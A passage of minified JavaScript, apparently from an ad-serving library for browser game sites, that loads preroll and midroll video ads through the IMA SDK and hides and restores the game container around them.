                    "undefined" !== typeof f.adEventCallback && window[f.adEventCallback].call(this, "error", "Ad took too long to load ( > 10 seconds )")
                }, 1E4)
            },
            se: function() {
                if (!0 === a.Pa) {
                    a.Vd();
                    if (!0 !== a.options.waitForClickMid || a.hg) try {
                        a.sc(), a.B.start()
                    } catch (b) {
                        a.j(32)
                    } else clearTimeout(a.Nc), !0 === a.Qa.prefetchMidroll && a.vb(), a.Pb ? (a.sc(), a.B.start()) : a.ug(a.md);
                    return !1
                }
                null === a.Na && (a.Na = !0);
                if (!a.mb("midroll")) return a.Na = null, a.destroy(), !1;
                a.requestAds("midroll")
            },
            Eb: function(b) {
                "preroll" === b ? a.bd(!1) : "midroll" === b && a.se()
            },
            Sl: function() {
                return !a.ad().classList.contains("removed")
            },
            Fh: function(b) {
                setTimeout(function() {
                    !0 === a.O ? (a.u().classList.remove("wgMidroll"), a.kc()) : a.Bc();
                    a.Td();
                    a.fk()
                }, !0 === (void 0 === b ? !1 : b) ? 0 : 2E3)
            },
            Bc: function() {
                a.ja.classList.add("wgHidden")
            },
            kc: function() {
                a.hg = !1;
                a.la.classList.add("wgHidden")
            },
            kk: function() {
                a.ja.classList.add("lowZi")
            },
            jk: function() {
                a.la.classList.add("lowZi")
            },
            pg: function() {
                a.O ? a.jk() : a.kk()
            },
            xl: function() {
                a.O = !1;
                a.xd();
                a.vb()
            },
            il: function(b) {
                if (a.Md) return !0;
                "preroll" === b ? a.Sb() : "midroll" === b && a.kc();
                return !1
            },
            yg: null,
            fetchAd: function(b, c) {
                b = void 0 === b ? null : b;
                c = void 0 === c ? !1 : c;
                if (!0 === a.options.noAd) return a.destroy(), !1;
                a.yg = b;
                a.options.$c = [b, c];
                a.j(33, b);
                a.Na = null;
                a.Kd = !0;
                a.ld = !1;
                a.O = !1;
                a.La = !1;
                !0 === c && (a.Jf = !1, a.Uc = !1, a.Vc = !1, a.contentContainer = null, a.ai());
                if (!0 === a.Za || a.isMobile() && !a.Ri()) a.Jc();
                else if (!0 !== a.ef)
                    if (!0 === a.Pa) a.Bc(), a.kc(), a.vb(), a.B.start();
                    else var d = setInterval(function() {
                        if (a.u()) {
                            clearInterval(d);
                            a.xd();
                            try {
                                a.updateSplash("preroll", {
                                    title: a.ub(t().gameName, a.options.titleExtract),
                                    Lb: t().gameThumbnail
                                })
                            } catch (e) {}(!0 === a.Pa || a.mb("preroll")) && a.vb()
                        }
                    }, 100)
            },
            md: null,
            Wd: null,
            ng: null,
            refetchAd: function(b, c) {
                console.log("showing ad 2");
                b = void 0 === b ? null : b;
                c = void 0 === c ? null : c;
                a.Ga() && console.debug("Refetching ad", arguments);
                if (arguments && arguments[0] && -1 < arguments[0].toString().indexOf("ad().refetchAd()")) return !1;
                a.md = "object" === typeof b ? b : "object" === typeof c ? c : {};
                if (!0 === a.Ab) return !1;
                "function" === typeof b && (a.Wd = b);
                b && "object" === typeof b && (a.Wd = b[0], a.ng = b[1]);
                if (!0 === a.options.noAd) {
                    if ("function" === typeof b) try {
                        b()
                    } catch (d) {}
                    a.j(34);
                    return !1
                }
                if (0 < a.adCount.midroll.limit) {
                    if (a.adCount.midroll.count >= a.adCount.midroll.limit) return a.j(35), !1;
                    a.j(36, a.adCount.midroll.limit, a.adCount.midroll.count)
                } else a.j(37);
                a.Na = null;
                a.ld = !1;
                a.O = !0;
                a.Qa.prefetchMidroll = a.md && !1 === a.md.prefetch ? !1 : !1 === a.Qa.prefetchMidroll ? !1 : !0;
                if (!1 === a.options.waitForClickMid || !0 === a.Qa.prefetchMidroll) return a.Bb = !0, a.Ed(), a.Td(), a.u().classList.add("wgMidroll"), !0 !== a.Qa.prefetchMidroll ? a.vb(a.O && !1 === a.options.waitForClickMid ? !1 : !0) : a.gi(), a.vh(), !1;
                if (!0 !== a.Qa.prefetchMidroll) {
                    a.ug(a.md);
                    try {
                        a.updateSplash("midroll", {
                            title: a.ub(t().gameName, a.options.titleExtract),
                            Lb: a.zc.bg + t().gameThumbnail
                        })
                    } catch (d) {}
                }!0 !== a.Pa && !a.mb("midroll") || !0 === a.Qa.prefetchMidroll || a.vb()
            },
            Jg: -1,
            Le: function(b) {
                a.j("Getting: reiniting ...");
                a.j(38);
                a.B && (a.B.destroy(), a.B = null);
                a.Z && a.Z.destroy();
                a.za && a.za.destroy();
                a.Vh();
                a.Ld();
                a.Jg = setInterval(function() {
                    null !== a.za && (clearInterval(a.Jg), a.ze(), a.za.initialize(), a.Eb(b))
                }, 1)
            },
            Rh: 0,
            Ce: !1,
            Gd: !1,
            Qh: !1,
            tj: function(b) {
                b.preventDefault();
                b.stopPropagation();
                if (!a.Hf()) return a.Ka ? (a.B.pause(), a.va.resume && a.va.yd(), a.X && a.X.elements.resume && a.X.yd.call(a.X)) : (a.B.resume(), a.va.resume && a.va.Hb(), a.X && a.X.elements.resume && a.X.Hb.call(a.X)), !1;
                if (a.wa && !1 === a.wa.visible && !0 === a.Gd && a.Ec() && !1 !== a.options.cpp) return a.wa.show.call(a.wa), !1
            },
            kh: function() {
                a.u().querySelectorAll(".wgcppe")[0].style = "";
                if (a.Ec() && 0 < a.currentAd.getVastMediaWidth() && 0 < a.currentAd.getVastMediaWidth()) {
                    var b = a.u().getBoundingClientRect(),
                        c = parseInt(a.currentAd.getVastMediaWidth() + 20, 10),
                        d = parseInt(a.currentAd.getVastMediaHeight() + 20, 10);
                    a.u().querySelectorAll(".wgcppe")[0].style = "width:" + c + "px; height:" + d + "px; top:" + ((b.height - d) / 2 - 37) + "px; left:" + (b.width - c) / 2 + "px;"
                }
            },
            sc: function() {
                try {
                    if (!a.currentAd) return !1;
                    !1 === a.Qh && (a.u().querySelectorAll(".wgcppe")[0].addEventListener(a.na, a.tj, !0), a.Qh = !0);
                    if (a.Nb() && a.currentAd.getDuration() <= a.Rh / 1E3) return !1;
                    a.j(39);
                    a.u().classList.add("wgNoClick");
                    a.kh();
                    window.addEventListener("resize", a.kh, !1);
                    a.Gd = !0
                } catch (b) {}
            },
            Rb: function() {
                if (!a.Hf()) return !1;
                try {
                    a.j(40), a.u().classList.remove("wgNoClick"), a.Gd = !1
                } catch (b) {}
                a.X && a.X.isVisible && a.X.Ze.call(a.X)
            },
            destroy: function() {
                a.u().classList.remove("wgInited");
                document.querySelectorAll("body")[0].classList.remove("wgFixed");
                a.u().classList.remove("wgAdPaused");
                a.u().removeAttribute("cpp");
                a.bb = !1;
                a.Ab = !1;
                try {
                    document.activeElement.blur(), window.focus()
                } catch (b) {}
                a.we();
                a.Rb();
                a.Ch();
                a.B && (a.S && a.Mb(a.S.adTagUrl) && a.we(), a.B.destroy(), a.B = null);
                a.Uh();
                0 < a.lt && (a.O ? a.Ac("Midroll") : a.Ac("Preroll"));
                a.va.ye();
                a.sd();
                a.Fa();
                a.Vh();
                a.Uc && !a.Vc ? "undefined" != typeof a.jingle && a.jingle.ha && !a.O ? (a.jingle.play(), a.Jc(), a.Sb(), a.td(), a.Fh()) : (a.Jc(), a.Fh(), a.Sb(), a.td()) : a.td();
                if (a.O) {
                    if (a.options.promoGames && (0 === Math.ceil(parseInt(a.ae, 10) - 1) % a.options.promoGames.no || 1 === parseInt(a.ae, 10)) && !0 === a.promoGames.Wg && 0 < a.ae && "undefined" !== typeof a.promoGames && a.promoGames.container) a.promoGames.show(), a.promoGames.Wg = !1;
                    else if ("function" === typeof a.Wd) try {
                        null !== a.ng ? a.Wd.call(a.ng) : a.Wd.call()
                    } catch (b) {
                        a.j(41)
                    } else if ("function" === typeof window[a.options.midrollCallback]) try {
                        window[f.midrollCallback].call()
                    } catch (b) {}
                    a.da.pa && a.da.pa.SendMessage(a.da.lb, "Resume")
                } else if ("function" === typeof a.yg) try {
                    a.yg.call()
                } catch (b) {
                    a.j(42)
                }
                a.mad && a.options.mad && !a.isMobile() && (a.mad.ha || a.mad.init());
                if (!1 !== a.promoGames.Sf) return a.promoGames.Vj(), !1
            },
            Ck: window.location.href,
            ji: !1,
            Hj: function() {
                if (!0 === a.ji) return !1;
                a.ji = !0;
                document.body.addEventListener(a.na, function() {
                    var b = window[window.preroll.config.loaderObjectName];
                    if (b && b.Ck !== window.location.href) var c = setInterval(function() {
                        if (document.getElementById(a.xa) || document.getElementsByClassName(a.xa)[0] || document.querySelectorAll(a.xa)[0] || document.querySelectorAll("#" + a.xa)[0] || document.querySelectorAll("." + a.xa)[0] || document.querySelectorAll(a.xa)[0]) clearInterval(c), a.fetchAd(null, !0)
                    }, 100)
                }, !1)
            },
            gk: function() {
                a.destroy();
                a.j(43)
            },
            mk: function(b, c) {
                var d = b.match(/cust_params=([0-9A-Za-z%_\-\.]+)/i);
                null !== d && 0 < d.length ? b = b.replace(d[1], d[1] + encodeURIComponent("&" + c)) : b = b += (0 < b.indexOf("?") ? "&" : "?") + "cust_params=" + encodeURIComponent(c);
                return b
            },
            ga: function(b, c, d, e) {
                var g;
                a.options = f ? f : window.preroll.config;
                !1 === (void 0 === e ? !0 : e) ? g = !1 : d ? "preroll" === d && a.options.customParamsPre ? g = a.options.customParamsPre : "midroll" === d && a.options.customParamsMid ? g = a.options.customParamsMid : g = !1 : !a.O && a.options.customParamsPre ? g = a.options.customParamsPre : a.O && a.options.customParamsMid ? g = a.options.customParamsMid : g = !1;
                if (g || c) c && g ? g = g + "&" + c : !g && c && (g = c), c = b.match(/cust_params=([0-9A-Za-z%_\-\.]+)/i), null !== c && 0 < c.length ? b = b.replace(c[1], c[1] + encodeURIComponent("&" + g)) : b = b += (0 < b.indexOf("?") ? "&" : "?") + "cust_params=" + encodeURIComponent(g);
                b && window.wgNetworkId && a.Yf(b) && (b = b.replace("/1002212/", window.wgNetworkId));
                b && 1 === window.wgAudioAd && a.Yf(b) && -1 === b.indexOf("&ad_type=") && (b = b + (-1 < b.indexOf("?") ? "&" : "?") + "ad_type=audio_video");
                return b
            },
            Tg: function(b) {
                switch (a.options.vpaidMode) {
                    case "disabled":
                        a.vpaidMode = google && google.ima && google.ima.ImaSdkSettings && google.ima.ImaSdkSettings.VpaidMode.DISABLED ? google.ima.ImaSdkSettings.VpaidMode.DISABLED : 0;
                        break;
                    case "enabled":
                        a.vpaidMode = google && google.ima && google.ima.ImaSdkSettings && google.ima.ImaSdkSettings.VpaidMode.ENABLED ? google.ima.ImaSdkSettings.VpaidMode.ENABLED : 1;
                        break;
                    case "insecure":
                        a.vpaidMode = google && google.ima && google.ima.ImaSdkSettings && google.ima.ImaSdkSettings.VpaidMode.INSECURE ? google.ima.ImaSdkSettings.VpaidMode.INSECURE : 2;
                        break;
                    default:
                        a.vpaidMode = google && google.ima && google.ima.ImaSdkSettings && google.ima.ImaSdkSettings.VpaidMode.INSECURE ? google.ima.ImaSdkSettings.VpaidMode.INSECURE : 2
                }
                0 === b.indexOf("//") && (b = "https:" + b);
                var c = new google.ima.AdsRequest;
                c.adTagUrl = b;
                a.j(44, a.ic().w, a.ic().h);
                a.bi(a.u().parentNode.getBoundingClientRect().width, a.u().parentNode.getBoundingClientRect().height);
                a.wd() ? (c.linearAdSlotWidth = a.ka.w, c.linearAdSlotHeight = a.ka.h, c.nonLinearAdSlotWidth = a.ka.w, c.nonLinearAdSlotHeight = a.ka.h) : (c.linearAdSlotWidth = a.ic().w, c.linearAdSlotHeight = a.ic().h, c.nonLinearAdSlotWidth = a.ic().w, c.nonLinearAdSlotHeight = a.ic().h);
                a.j(45, c.linearAdSlotWidth);
                c.setAdWillAutoPlay(!1);
                c.setAdWillPlayMuted(!1);
                !0 === a.options.he && (a.B.setVolume(0), c.setAdWillPlayMuted(!0));
                c.forceNonLinearFullSlot = !0;
                c.vastLoadTimeout = 1E4;
                a.S = c;
                a.Ga() && (console.log("Adslot size:", c.linearAdSlotWidth, "x", c.linearAdSlotHeight), console.log("Adslot settings:", c))
            },
            jm: function() {
                a.Sb()
            },
            G: function() {
                (!a.contentContainer || a.contentContainer && !a.contentContainer.parentNode || a.di) && a.Se();
                return a.contentContainer
            },
            yl: function() {
                return a.u().getElementsByTagName("iframe")[0] || !1
            },
            Se: function() {
                a.xa = f.contentContainer || f.contentContainerQuery;
                a.j(46, a.xa);
                try {
                    return a.contentContainer = document.getElementById(a.xa) || document.getElementsByClassName(a.xa)[0] || document.querySelectorAll(a.xa)[0] || document.querySelectorAll("#" + a.xa)[0] || document.querySelectorAll("." + a.xa)[0] || document.querySelectorAll(a.xa)[0], a.di = !1, a.j(47, a.xa), 300 < a.contentContainer.getBoundingClientRect().width || a.contentContainer.getBoundingClientRect(), !0
                } catch (b) {
                    return a.j(48, a.xa), !1
                }
            },
            Jf: !1,
            Uc: !1,
            Vc: !1,
            Vi: null,
            ne: [],
            dh: {
                width: 0,
                height: 0
            },
            uc: {
                w: 0,
                h: 0
            },
            og: !1,
            oe: !1,
            hb: null,
            ai: function() {
                if (!0 === a.options.noAd || a.Jf || !1 === a.options.replace) return !1;
                var b, c, d = a.G().querySelector("object embed") || a.G().querySelector("object");
                d && d.getAttribute("width") && d.getAttribute("height") ? (b = parseInt(d.getAttribute("width"), 10) + (-1 < d.getAttribute("width").indexOf("%") ? "%" : "px"), c = parseInt(d.getAttribute("height"), 10) + (-1 < d.getAttribute("height").indexOf("%") ? "%" : "px")) : (b = "100%", c = "100%");
                a.s("ruffle-player{\n                        display:block;\n                        width:" + b + ";\n                        height:" + c + ";\n                    }");
                a.uc = {
                    w: parseInt(b, 10) > a.G().getBoundingClientRect().width ? parseInt(b, 10) : a.G().getBoundingClientRect().width,
                    h: parseInt(c, 10) > a.G().getBoundingClientRect().height ? parseInt(c, 10) : a.G().getBoundingClientRect().height
                };
                b = parseInt(window.getComputedStyle(a.G(), null).getPropertyValue("padding-left"), 10) || 0;
                c = parseInt(window.getComputedStyle(a.G(), null).getPropertyValue("padding-right"), 10) || 0;
                d = parseInt(window.getComputedStyle(a.G(), null).getPropertyValue("padding-top"), 10) || 0;
                var e = parseInt(window.getComputedStyle(a.G(), null).getPropertyValue("padding-bottom"), 10) || 0;
                a.uc = {
                    w: a.uc.w - b - c,
                    h: a.uc.h - d - e
                };
                a.s(".wgContentSafeSize{\n                    width: " + a.uc.w + "px; \n                    height: " + a.uc.h + "px;\n                    max-width:100%;\n                    position:relative;  \n                    " + (-1 < a.options.minHeight.indexOf("px") ? "min-height:" + a.options.minHeight : "") + ";}");
                "body" !== a.G().nodeName.toLocaleLowerCase() && !0 !== a.options.nss && a.G().classList.add("wgContentSafeSize");
                var g;
                0 < a.contentContainer.querySelectorAll("iframe").length && -1 === a.contentContainer.querySelectorAll("iframe")[0].src.indexOf("facebook") && -1 === a.contentContainer.querySelectorAll("iframe")[0].src.indexOf("google") && (g = {
                    Db: a.contentContainer.querySelectorAll("iframe")[0],
                    src: a.contentContainer.querySelectorAll("iframe")[0].src
                });
                try {
                    a.og = (new URL(window.location.href)).origin === g.Db.src.substring(0, g.Db.src.length - 1) || window.location.href === g.Db.src
                } catch (m) {}
                try {
                    a.Vi = a.contentContainer.innerHTML;
                    a.ne = [];
                    if ("object" === typeof g) a.oe = !0, a.hb = g.src, g.Db.hasAttribute("src") && !a.og && !1 !== a.options.restore && (g.Db && g.Db.contentWindow ? g.Db.contentWindow.location.replace("about:blank") : g.Db.setAttribute("src", "about:blank")), g.Db.setAttribute("data-wg-content", !0);
                    else {
                        var p = document.documentElement.outerHTML.replace(/(\x3c!--[^]*?--\x3e)|(\/\*[^]+\*\/)/igm, "").match(/(data|value|movie)=["|']+(.*?swf.*?(?=["|'|\s]+))/i);
                        p && (a.hb = p[2])
                    }
                    for (g = 0; g < a.contentContainer.childNodes.length; g++) "undefined" !== typeof a.contentContainer.childNodes[g].hasAttribute && a.contentContainer.childNodes[g].hasAttribute("data-wgplayer") || a.ne.push(a.contentContainer.childNodes[g]);
                    a.dh.width = a.contentContainer.getBoundingClientRect().width;
                    a.dh.height = a.contentContainer.getBoundingClientRect().height;
                    a.Jf = !0
                } catch (m) {
                    a.j(49, m)
                }
            },
            Wi: null,
            $j: function() {
                if (a.Uc && !a.Vc) return !1;
                if (a.oe) a.Uc = !0, a.Vc = !1;
                else {
                    var b = !1;
                    try {
                        for (; a.contentContainer.lastChild && !b;) "undefined" !== typeof a.contentContainer.lastChild.hasAttribute && a.contentContainer.lastChild.hasAttribute("data-wgplayer") ? b = !0 : a.contentContainer.removeChild(a.contentContainer.lastChild);
                        a.Uc = !0;
                        a.Vc = !1
                    } catch (c) {
                        console.log(c), a.j(50)
                    }
                }
                a.Wi = (new MutationObserver(function() {
                    a.j(51)
                })).observe(a.G(), {
                    childList: !0,
                    subtree: !1
                });
                a.G().getBoundingClientRect().height < a.uc.h && "body" !== a.G().nodeName.toLocaleLowerCase() && !0 !== a.options.nss && a.G().classList.add("wgContentSafeSize")
            },
            abort: function() {
                a.ef = !0
            },
            um: function() {
                a.ef = !1
            },
            ol: null,
            Sb: function() {
                a.rewarded && a.options.rewarded && !a.rewarded.ha && "ongamerestore" === a.options.rewarded.init && a.rewarded.init(a.options.rewarded);
                if (!1 === a.oe) {
                    if (a.u())
                        for (; a.contentContainer.firstChild;)
                            if (1 < a.contentContainer.childNodes.length)
                                if (a.contentContainer.firstChild.id === a.ia.id) {
                                    a.contentContainer.firstChild.classList.add("removed");
                                    break
                                } else a.contentContainer.removeChild(a.contentContainer.lastChild);
                    else {
                        a.u().classList.add("removed");
                        break
                    }
                    for (var b = 0; b < a.ne.length; b++) a.contentContainer.appendChild(a.ne[b]);
                    a.$i = document.write;
                    document.write = function(e) {
                        a.j(53, e)
                    };
                    a.aj = document.writeln;
                    document.writeln = function() {};
                    b = this.contentContainer.getElementsByTagName("script");
                    for (var c = 0; c < b.length; c++) try {
                        if (b[c].innerHTML) eval(b[c].innerHTML);
                        else if (b[c].getAttribute("src")) {
                            var d = document.createElement("script");
                            d.src = b[c].getAttribute("src");
                            d.type = "text/javascript";
                            d.addEventListener("load", function() {
                                var e = document.createEvent("Event");
                                e.initEvent("load", !1, !1);
                                window.dispatchEvent(e)
                            });
                            document.getElementsByTagName("head")[0].appendChild(d)
                        }
                    } catch (e) {
                        a.j(54, e)
                    }
                    a.O || !1 === a.options.restore || (!0 === a.options.fe && a.isFlashGame ? a.Hh() : (d = document.querySelector("[data-wg-content]")) && !a.og && (d.hasAttribute("src") ? d.src = a.hb : d.hasAttribute("value") && (d.value = a.hb)));
                    document.write = a.$i;
                    document.writeln = a.aj;
                    a.Vc = !0;
                    a.Uc = !1
                } else !1 !== a.options.restore && (d = document.querySelector("[data-wg-content]")) && (d.contentDocument ? d.hasAttribute("src") ? d.contentWindow.location.replace(a.hb) : d.hasAttribute("value") ? d.value = a.hb : d.hasAttribute("data") && (d.data = a.hb) : d.hasAttribute("src") ? d.src = a.hb : d.hasAttribute("value") ? d.value = a.hb : d.hasAttribute("data") && (d.data = a.hb), a.u().classList.add("removed"));
                if (a.O) {
                    if ("function" === typeof window[a.options.midrollCallback]) try {
                        window[f.midrollCallback].call()
                    } catch (e) {}
                } else {
                    "function" === typeof window[f.removeAdsCallback] && window[f.removeAdsCallback].call(this, {
                        device: a.eb.ib,
                        cc: a.G()
                    });
                    try {
                        document.dispatchEvent(new CustomEvent("wgContentResumePreroll", {
                            detail: null
                        }))
                    } catch (e) {
                        a.j(52, e)
                    }
                    if ((d = document.getElementsByClassName("wgContentSafeSize")) && 0 < d.length && !0 !== a.options.pss && !0 !== a.options.fe)
                        for (b = 0; b < d.length; ++b) d[b].classList.remove("wgContentSafeSize")
                }
            },
            ya: null,
            Ji: function() {
                a.ya = a.F("div", "LoadingContainer");
                a.ya.classList.add("wgHidden");
                a.ya.innerHTML = "<div></div>";
                a.u().appendChild(a.ya)
            },
            Sa: null,
            Ug: function() {
                a.Sa = a.F("div", "LoadingAnim");
                a.Sa.classList.add("wgHidden");
                a.Sa.innerHTML = "<div></div><div></div><div></div><div></div><span>Game will resume momentarily ...</span>";
                a.G().appendChild(a.Sa);
                a.s("\n                .wgLoadingAnim {\n                    width: 100%;\n                    height: 100%;\n                    display: flex;\n                    align-items: center;\n                    justify-content: center;\n                    position: absolute;\n                    top:0;\n                    left:0;\n                    z-index: 100000000;\n                    background: rgba(0,0,0,.70);\n                }\n                .wgLoadingAnim div {\n                    box-sizing: border-box;\n                    display: block;\n                    position: absolute;\n                    width: 64px;\n                    height: 64px;\n                    margin: 4px;\n                    animation: wgLoadingAnim 1s infinite;\n                    border-style: solid;\n                    border-color: #fff transparent transparent transparent;\n                    border-width:3px;\n                    border-radius:50%;\n                }\n                .wgLoadingAnim div:nth-child(1) {\n                    animation-delay: -0.9s;\n                }\n                .wgLoadingAnim div:nth-child(2) {\n                    animation-delay: -0.8s;\n                }\n                .wgLoadingAnim div:nth-child(3) {\n                    animation-delay: -0.1s;\n                }\n                @keyframes wgLoadingAnim {\n                    0% {\n                        transform: rotate(0deg);\n                    }\n                    100% {\n                        transform: rotate(360deg);\n                    }\n                }\n                \n                .wgLoadingAnim span {\n                    font-family: 'roboto', sans-serif;\n                    width: 100%;\n                    text-align: center;\n                    color: #fff;\n                    padding-top: 150px;\n                    position: absolute;\n                    z-index: 99999999999999999999;\n                }")
            },
            gi: function(b) {
                a.Sa.parentNode || (a.G().classList.add("wgRelative"), a.G().appendChild(a.Sa));
                b && (a.Sa.querySelector("span").innerHTML = b);
                a.Sa.classList.remove("wgHidden")
            },
            xe: function() {
                a.Sa.classList.add("wgHidden");
                a.Sa.querySelector("span").innerHTML = "Game will resume momentarily ...";
                a.Sa.parentNode && a.Kj(a.G(), a.Sa) && (a.G().classList.remove("wgRelative"), a.G().removeChild(a.Sa))
            },
            Kj: function(b, c) {
                for (c = c.parentNode; null != c;) {
                    if (c == b) return !0;
                    c = c.parentNode
                }
                return !1
            },
            bj: function(b) {
                !0 !== b && !0 === a.Ab && (!0 === a.O ? a.kc() : a.Bc());
                a.ya && setTimeout(function() {
                    a.ya.classList.remove("wgVisible");
                    a.ya.classList.add("wgHidden")
                }, 0)
            },
            Fa: function(b, c, d) {
                if (null !== a.Na && !0 !== (void 0 === b ? !1 : b) && !0 !== (void 0 === c ? !1 : c)) return !1;
                a.bj(void 0 === d ? !1 : d)
            },
            Mc: function(b, c) {
                b = void 0 === b ? !1 : b;
                if (!0 === (void 0 === c ? !1 : c)) return a.ya.classList.remove("wgHidden"), a.ya.classList.add("wgVisible"), !1;
                !0 !== b ? a.ya && a.ya.parentNode && a.ya.classList.remove("wgHidden") : a.ya && a.ya.parentNode && a.ya.classList.remove("wgHidden")
            },
            ah: null,
            wa: null,
            ll: function() {
                return {
                    elements: {
                        Ib: null,
                        nb: null,
                        Jb: null,
                        Kb: null,
                        oc: null,
                        title: null,
                        buttons: null,
                        zd: null,
                        no: null,
                        $e: null
                    },
                    visible: !1,
                    init: function() {
                        var b = this;
                        this.elements.Ib = a.F("div", "cCf_1");
                        this.elements.Ib.classList.add("removed");
                        a.s("." + this.elements.Ib.classList[0] + "{ position:absolute; top:0; left:0; width:100%; height:10px; box-sizing:border-box; padding:0; z-index:2147483647; background:rgba(0,0,0,.8);}");
                        this.elements.nb = a.F("div", "cCf_2");
                        this.elements.nb.classList.add("removed");
                        a.s("." + this.elements.nb.classList[0] + "{ position:absolute; bottom:0; left:0;  width:100; height:10px; box-sizing:border-box; padding:0; z-index:2147483647; background:rgba(0,0,0,.8);}");
                        this.elements.Jb = a.F("div", "cCf_3");
                        this.elements.Jb.classList.add("removed");
                        a.s("." + this.elements.Jb.classList[0] + "{ position:absolute; top:0; left:0; width:10px; height:10px; box-sizing:border-box; padding:0; z-index:2147483647; background:rgba(0,0,0,.8);}");
                        this.elements.Kb = a.F("div", "cCf_4");
                        this.elements.Kb.classList.add("removed");
                        a.s("." + this.elements.Kb.classList[0] + "{ position:absolute; top:0; right:0; width:10px; height:10px; box-sizing:border-box; padding:0; z-index:2147483647; background:rgba(0,0,0,.8);}");
                        this.elements.oc = a.F("div", "cCf_win");
                        a.s("." + this.elements.oc.classList[0] + "{ position:absolute; top:calc(0px - 50px); left:0; bottom:0; right:0; pointer-events:none; height: fit-content; width: fit-content; display: table; box-sizing:border-box; padding:20px; z-index:2147483647; background:rgba(255,255,255,1); border-radius:10px; margin:auto;}");
                        this.elements.oc.classList.add("removed");
                        a.u().appendChild(this.elements.oc);
                        this.elements.title = a.F("div", "cCf_t");
                        this.elements.title.innerText = "Visit advertiser";
                        a.s("." + this.elements.title.classList[0] + "{color:#1d1d1d; font-size:16px; text-align:left; font-family: 'roboto', sans-serif; font-weight:600;}");
                        this.elements.oc.appendChild(this.elements.title);
                        this.elements.buttons = a.F("div", "cCf_b");
                        a.s("." + this.elements.buttons.classList[0] + "{display: grid; grid-template-columns: auto auto; text-align:center; box-sizing:border-box; margin-top:10px;}");
                        this.elements.oc.appendChild(this.elements.buttons);
                        this.elements.no = a.F("div", "cCf_n");
                        this.elements.no.innerText = "BACK TO GAME";
                        a.s("." + this.elements.no.classList[0] + "{display:block; white-space: nowrap; user-select:none;  cursor:pointer;  margin:10px; background-color:#1976d5; color:#fff; font-size:14px; text-align:center; font-family: 'roboto', sans-serif; font-weight:600; border-radius:5px; padding:10px 15px;}");
                        this.elements.buttons.appendChild(this.elements.no);
                        this.elements.Ib.addEventListener("click", this.ve.bind(this));
                        this.elements.nb.addEventListener("click", this.ve.bind(this));
                        this.elements.Jb.addEventListener("click", this.ve.bind(this));
                        this.elements.Kb.addEventListener("click", this.ve.bind(this));
                        this.elements.zd = a.F("div", "cCf_y");
                        this.elements.zd.innerText = "YES";
                        a.s("." + this.elements.zd.classList[0] + "{display:block; white-space: nowrap; user-select:none; cursor:pointer; margin:10px; background-color:#fff; color:#1976d5; font-size:14px; text-align:center; font-family: 'roboto', sans-serif; font-weight:600; border-radius:5px; padding:10px 15px;}");
                        this.elements.buttons.appendChild(this.elements.zd);
                        this.elements.zd.addEventListener("click", function() {
                            b.aa(!1)
                        }, !1);
                        a.u().insertBefore(this.elements.Ib, a.u().firstChild);
                        a.u().insertBefore(this.elements.nb, a.u().firstChild);
                        a.u().insertBefore(this.elements.Jb, a.u().firstChild);
                        a.u().insertBefore(this.elements.Kb, a.u().firstChild)
                    },
                    show: function() {
                        !0 === a.Gd && a.Rb();
                        this.elements.Ib.classList.remove("removed");
                        this.elements.nb.classList.remove("removed");
                        this.elements.Jb.classList.remove("removed");
                        this.elements.Kb.classList.remove("removed");
                        this.elements.oc.classList.remove("removed");
                        var b = this.elements.zd.getBoundingClientRect(),
                            c = a.u().getBoundingClientRect();
                        this.elements.Ib.style = "width:100%; height:" + Math.ceil(parseInt(b.top - c.top, 10)) + "px; top:0; left:0;";
                        this.elements.nb.style = "width:100%; height:" + Math.ceil(parseInt(c.bottom - b.bottom, 10)) + "px; bottom:0; left:0;";
                        this.elements.Jb.style = "height:" + Math.ceil(parseInt(b.height, 10)) + "px; width:" + Math.ceil(parseInt(b.left - c.left, 10)) + "px; left:0; top:" +
                            Math.ceil(parseInt(b.top - c.top, 10)) + "px";
                        this.elements.Kb.style = "height:" + Math.ceil(parseInt(b.height, 10)) + "px; width:" + Math.ceil(parseInt(c.right - b.right, 10)) + "px; right:0; top:" + Math.ceil(parseInt(b.top - c.top, 10)) + "px";
                        var d = c.height + b.height - parseInt(this.elements.Ib.getBoundingClientRect().height + this.elements.nb.getBoundingClientRect().height + this.elements.Jb.getBoundingClientRect().height + this.elements.Kb.getBoundingClientRect().height, 10);
                        0 !== d && (this.elements.nb.style = "width:100%; height:" +
                            Math.ceil(parseInt(c.bottom - b.bottom, 10) + (0 < d ? d : -d)) + "px; bottom:0; left:0;");
                        this.visible = !0
                    },
                    aa: function(b) {
                        !1 === a.Gd && !0 === (void 0 === b ? !0 : b) && a.sc();
                        this.elements.Ib.classList.add("removed");
                        this.elements.nb.classList.add("removed");
                        this.elements.Jb.classList.add("removed");
                        this.elements.Kb.classList.add("removed");
                        this.elements.oc.classList.add("removed");
                        this.visible = !1
                    },
                    remove: function() {
                        a.ah.classList.add("removed")
                    },
                    display: function() {
                        a.ah.classList.remove("removed")
                    },
                    ve: function(b) {
                        b.preventDefault();
                        b.stopPropagation();
                        this.aa()
                    }
                }
            },
            promoGames: {
                container: null,
                feedURL: null,
                af: 20,
                gf: !0,
                Sf: !1,
                Wg: !0,
                elements: {
                    close: null,
                    title: null,
                    summary: null,
                    bg: null,
                    Qb: null,
                    item: {
                        container: null,
                        pm: null,
                        playButton: null,
                        title: null
                    },
                    items: []
                },
                qh: function() {
                    return "Closing in " + this.af + " seconds."
                },
                init: function(b) {
                    return function() {
                        this.container = a.F("div", "PromoGames");
                        this.container.classList.add("removed");
                        var c = "." + this.container.classList[0] + "{ position:absolute; top:0; left:0; width:100%; height:100%; box-sizing:border-box; padding:10%;}";
                        a.s(c);
                        a.u().appendChild(this.container);
                        var d = a.F("div", "PromoGamesTitle");
                        d.innerText = "Other  awesome games";
                        c = "." + d.classList[0] + "{font-size:30px;  font-family: 'roboto', sans-serif; color:#fff; text-transform:uppercase; }";
                        a.s(c);
                        this.container.appendChild(d);
                        d = a.F("div", "PromoGamesSubTitle");
                        d.innerText = "A selection of awesome  games, very appreciated by our visitors";
                        c = "." + d.classList[0] + "{font-size:18px;  font-family: 'roboto', sans-serif; color:#fff; text-transform:none; }";
                        a.s(c);
                        this.container.appendChild(d);
                        this.elements.close = a.F("a", "PromoGamesClose");
                        this.elements.close.innerText = this.qh();
                        c = "." + this.elements.close.classList[0] + "{ cursor:pointer; font-size: 14px; display: block; padding: 12px 50px 12px 20px; font-family: 'roboto', sans-serif; color: #fff; text-transform: none; background: rgba(47, 47, 47, 0.9); position: absolute; top: 10px; right: 10px; border-radius: 20px; }";
